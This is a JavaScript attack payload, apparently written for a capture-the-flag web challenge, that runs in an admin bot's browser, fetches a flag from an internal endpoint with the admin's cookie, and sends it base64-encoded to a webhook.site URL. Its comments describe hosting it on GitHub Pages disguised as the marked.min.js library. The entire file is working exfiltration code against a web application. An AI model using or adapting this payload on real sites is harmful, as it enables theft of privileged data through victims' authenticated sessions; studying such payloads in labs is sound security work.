// This code runs in the bot's browser which has the admin cookie

// *** VERY IMPORTANT ***
// You MUST replace the URL below with the CURRENT unique URL from webhook.site
// before pushing to GitHub Pages for the final attempt.
// Keep your webhook.site page OPEN at all times during the attack attempts.
const WEBHOOK_RECEIVE_URL = "https://webhook.site/01ae665a-40f6-4d3b-92d5-d3ee5bc3b1ba";

console.log("Malicious script is running!"); // Optional log in bot's console

// Step 1: Fetch the flag from the web server's internal endpoint (only works with admin cookie)
fetch("http://web:8080/flag")
  .then(response => {
      if (!response.ok) {
        throw new Error(`HTTP error fetching flag! status: ${response.status}`);
      }
      console.log("Flag fetch response received.");
      return response.text(); // Get the flag content (which is the flag itself)
  })
  .then(flagContent => {
      console.log("Flag content fetched successfully.");
      // Step 2: Exfiltrate the flag (base64 encoded) to our webhook.site URL
      // Send as a GET request with a query parameter 'flag'
      // Using the full URL is crucial as base href does not change the origin
      const exfil_url = `${WEBHOOK_RECEIVE_URL}/?flag=${btoa(flagContent)}`;
      console.log("Attempting exfiltration fetch to:", exfil_url);

      fetch(exfil_url) // Default method is GET
        .then(() => console.log("Exfiltration fetch completed."))
        .catch(err => console.error("Exfiltration fetch failed:", err));
  })
  .catch(error => {
      console.error("An error occurred during fetch or exfiltration:", error);
  });

// --- End of Malicious Payload ---
// Add dummy original marked.min.js content here if you want (optional)
// (Get it from http://65.174.201.109:8000/static/js/marked.min.js if needed)
